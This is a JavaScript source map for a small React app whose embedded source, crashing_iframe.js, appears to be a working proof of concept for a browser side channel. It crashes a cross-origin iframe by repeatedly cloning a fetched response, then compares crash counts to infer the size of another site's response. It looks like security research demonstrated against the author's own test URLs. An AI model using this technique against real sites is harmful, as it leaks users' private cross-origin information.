{"version":3,"sources":["crashing_iframe.js","App.js","index.js"],"names":["IFRAME_URL","TUNING_TARGET","TUNING_PRECISION","KB","MB","GB","wait","_callee","ms","regenerator_default","a","wrap","_context","prev","next","abrupt","Promise","resolve","setTimeout","stop","wait_until_crashed","_callee2","win","_context2","frames","length","wait_until_loaded","_callee3","_context3","is_same_origin","location","href","e","wait_until_sameorigin","_callee4","_context4","append_iframe","_callee5","url","f","has_loaded","_context5","document","createElement","src","onload","body","appendChild","ensure_iframe","_callee6","_context6","window","ensure_iframe_is_dead","_callee7","_context7","postMessage","action","reload_iframe","_callee8","_context8","get_count","_callee9","alloc_size","max_count","count","msg_handler","_args9","arguments","_context9","event","data","undefined","Infinity","addEventListener","removeEventListener","get_samples","_callee10","n","max","samples","i","_args10","_context10","t0","t1","sent","push","call","good_enough","measurement","b","x","tune_for_url","_callee11","initial_size","initial_step","size","high","low","step","_step","_args11","_context11","console","log","pretty_print_size","concat","Math","floor","measure","gb","mb","kb","_callee12","_args12","_context12","performance","now","sort","_callee13","res","_args13","_context13","URLInput","props","_this","Object","classCallCheck","this","possibleConstructorReturn","getPrototypeOf","id","uniqueId","react_default","htmlFor","label","className","type","defaultValue","onChange","children","React","Component","App","_this2","calibrate","setState","loadingState","state","calibrationUrl","allocSize","then","_ref","baseMeasurement","testUrl","m1","m2","diff","abs","is_equal","equal","setCalibrationUrl","target","value","setTestUrl","App_URLInput","onClick","ReactDOM","render","src_App_0","getElementById"],"mappings":"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","file":"static/js/main.ef2fb325.chunk.js","sourcesContent":["const IFRAME_URL = \"https://notsheddow.xyz/resp_clone/iframe.html\"\n\nconst TUNING_TARGET = 80;\nconst TUNING_PRECISION = 20;\n\nconst KB = 1024;\nconst MB = 1024*1024;\nconst GB = 1024*1024*1024;\n\nasync function wait(ms) {\n    return new Promise(resolve => setTimeout(resolve, ms));\n}\n\nasync function wait_until_crashed(win) {\n    while (win.frames.length > 0) {\n        await wait(1);\n    }\n}\n\nasync function wait_until_loaded(win) {\n    while (win.frames.length === 0) {\n        await wait(1);\n    }\n}\n\nfunction is_same_origin(win) {\n    try {\n        let _ = win.location.href; // eslint-disable-line no-unused-vars\n        return true;\n    }\n    catch (e) {\n        return false;\n    }\n}\n\nasync function wait_until_sameorigin(win) {\n    while (!is_same_origin(win)) {\n        await wait(1);\n    }\n}\n\nasync function append_iframe(url) {\n    let f = document.createElement('iframe');\n    f.src = url;\n    let has_loaded = new Promise(resolve => { f.onload = resolve });\n    document.body.appendChild(f);\n    return has_loaded;\n}\n\nasync function ensure_iframe() {\n    if (window.frames.length === 0) {\n        await append_iframe(IFRAME_URL);\n    }\n}\n\nasync function ensure_iframe_is_dead() {\n    if (window.frames[0].frames.length === 1) {\n        window.frames[0].postMessage({action: \"kill_process\"}, \"*\");\n        await wait_until_crashed(window.frames[0]);\n    }\n}\n\nasync function reload_iframe() {\n    window.frames[0].location = \"about:blank\";\n    await wait_until_sameorigin(window.frames[0]);\n    window.frames[0].location = IFRAME_URL\n    await wait_until_loaded(window.frames[0]);\n}\n\nasync function get_count(url, alloc_size, max_count = Infinity) {\n    let count = 0;\n    function msg_handler(event) {\n        count = event.data;\n    }\n\n    window.addEventListener(\"message\", msg_handler);\n    window.frames[0].postMessage({action: \"clone_until_crash\", url, alloc_size}, \"*\");\n    while (window.frames[0].frames.length > 0 && count < max_count) {\n        await wait(1);\n    }\n    window.removeEventListener(\"message\", msg_handler);\n\n    await ensure_iframe_is_dead();\n    await reload_iframe();\n    return count;\n}\n\nasync function get_samples(url, alloc_size, n = 5, max = Infinity) {\n    let samples = [];\n    for (let i = 0; i < n; i++) {\n        samples.push(await get_count(url, alloc_size, max));\n    }\n    return samples;\n}\n\nfunction is_between(x, a, b) {\n    return a <= x && x <= b;\n}\n\nfunction good_enough(measurement) {\n    return is_between(measurement, TUNING_TARGET - TUNING_PRECISION, TUNING_TARGET + TUNING_PRECISION);\n}\n\nasync function tune_for_url(url, initial_size, initial_step = 10*MB) {\n    let size = initial_size;\n\n    let measurement = await get_count(url, size, 200);\n    console.log(measurement);\n    let high, low;\n    if (good_enough(measurement)) {\n        return {size, measurement};\n    }\n    else if (measurement < TUNING_TARGET) {\n        // size too big\n        console.log(\"exponential search downwards\");\n        high = size;\n        let step = initial_step;\n        while (measurement < TUNING_TARGET) {\n            size -= step;\n            step *= 2;\n            measurement = await get_count(url, size, 200);\n            console.log(pretty_print_size(size));\n            console.log(measurement);\n            if (good_enough(measurement)) {\n                return {size, measurement}\n            }\n        }\n        low = size;\n    }\n    else {\n        console.log(\"exponential search upwards\");\n        low = size;\n        let step = initial_step;\n        while (measurement > TUNING_TARGET) {\n            size += step;\n            step *= 2;\n            measurement = await get_count(url, size, 200);\n            console.log(pretty_print_size(size));\n            console.log(measurement);\n            if (good_enough(measurement)) {\n                return {size, measurement}\n            }\n        }\n        high = size;\n    }\n\n    console.log(`Doing binary search between ${pretty_print_size(low)} and ${pretty_print_size(high)}`);\n\n    while (low < high) {\n        // skewed binary search for speed\n        size = Math.floor(low + (high - low)*0.6);\n        measurement = await get_count(url, size, 200);\n        console.log(pretty_print_size(size));\n        console.log(measurement);\n        if (good_enough(measurement)) {\n            break;\n        }\n        else if (measurement < TUNING_TARGET) {\n            // measurement too low, size too big\n            high = size;\n        }\n        else {\n            low = size;\n        }\n    }\n\n    measurement = await measure(url, size, 200);\n    if (!good_enough(measurement)) {\n        return tune_for_url(url, size, 5*MB)\n    }\n\n    return {size, measurement};\n}\n\nfunction pretty_print_size(size) {\n    let gb = Math.floor(size / GB);\n    let mb = Math.floor((size % GB) / MB);\n    let kb = Math.floor((size % MB) / KB);\n    return `size: ${gb} GB + ${mb} MB + ${kb} KB`;\n}\n\nasync function measure(url, alloc_size, max = Infinity) {\n    await ensure_iframe();\n    let t0 = window.performance.now();\n    let samples = await get_samples(url, alloc_size, 3, max);\n    console.log(`elapsed: ${window.performance.now() - t0}`);\n    console.log(samples);\n    samples.sort((a, b) => a-b);\n    return samples[1];\n}\n\nasync function calibrate(url, initial_size = undefined) {\n    await ensure_iframe();\n\n    let t0 = window.performance.now();\n    if (!initial_size) {\n        initial_size = 4*GB;\n    }\n    console.log(\"Tuning...\");\n    let res = await tune_for_url(url, initial_size);\n    console.log(`elapsed for tuning: ${window.performance.now() - t0}`);\n    return res;\n}\n\nfunction is_equal(m1, m2) {\n    let diff = Math.abs(m1 - m2);\n    return diff <= 0.4*m1 || diff <= 0.4*m2;\n}\n\nexport {calibrate, measure, is_equal};\n","import React from 'react';\nimport './App.css';\nimport { uniqueId } from 'lodash';\n\nimport { calibrate, measure, is_equal } from './crashing_iframe';\n\nclass URLInput extends React.Component {\n    constructor(props) {\n        super(props);\n        this.id = uniqueId('urlinput_');\n    }\n\n    render() {\n        return (\n            <div>\n                <label htmlFor={this.id}>{this.props.label}</label>\n                <input id={this.id} className=\"url-input\" type=\"text\" defaultValue={this.props.url} onChange={this.props.onChange}></input>\n                {this.props.children}\n            </div>\n        );\n    }\n}\n\nclass App extends React.Component {\n    constructor(props) {\n        super(props);\n        this.state = {\n            allocSize: null,\n            calibrationUrl: \"https://sheddow.xyz/flask/bytes?len=1000\",\n            testUrl: \"https://sheddow.xyz/flask/bytes?len=1025\",\n            loadingState: null,\n            baseMeasurement: null,\n            measurement: null,\n        };\n    }\n\n    componentDidMount() {\n        this.calibrate();\n    }\n\n    calibrate = () => {\n        this.setState({loadingState: \"Calibrating...\"});\n        calibrate(this.state.calibrationUrl, this.state.allocSize).then(({size, measurement}) => {\n            this.setState({loadingState: null, allocSize: size, baseMeasurement: measurement});\n        });\n    }\n\n    measure = () => {\n        this.setState({loadingState: \"Measuring...\"});\n        measure(this.state.testUrl, this.state.allocSize).then(count => {\n            this.setState({loadingState: null, measurement: count});\n            if (is_equal(this.state.baseMeasurement, this.state.measurement)) {\n                this.setState({equal: true});\n            }\n            else {\n                this.setState({equal: false});\n            }\n        });\n    }\n\n    setCalibrationUrl = (e) => {\n        this.setState({calibrationUrl: e.target.value});\n    }\n\n    setTestUrl = (e) => {\n        this.setState({testUrl: e.target.value});\n    }\n\n    render() {\n        return (\n            <div>\n                <URLInput label=\"Base URL\" url={this.state.calibrationUrl} onChange={this.setCalibrationUrl}>\n                    <span className=\"measurement\">{this.state.baseMeasurement}</span>\n                    {\n                        this.state.loadingState ?\n                        this.state.loadingState :\n                        <button onClick={this.calibrate}>Calibrate</button>\n                    }\n                </URLInput>\n                <URLInput label=\"Test URL\" url={this.state.testUrl} onChange={this.setTestUrl}>\n                    <span className=\"measurement\">{this.state.measurement}</span>\n                    {\n                        this.state.loadingState ?\n                        this.state.loadingState :\n                        <button onClick={this.measure}>Measure</button>\n                    }\n                </URLInput>\n                {\n                    this.state.measurement !== null && this.state.baseMeasurement !== null ?\n                    (\n                        this.state.equal ?\n                        <span className=\"equal\">Equal</span> :\n                        <span className=\"not-equal\">Not Equal</span>\n                    ) :\n                    null\n                }\n            </div>\n        );\n    }\n}\n\nexport default App;\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport App from './App';\n\nReactDOM.render(\n  <App />,\n  document.getElementById('root')\n);\n"],"sourceRoot":""}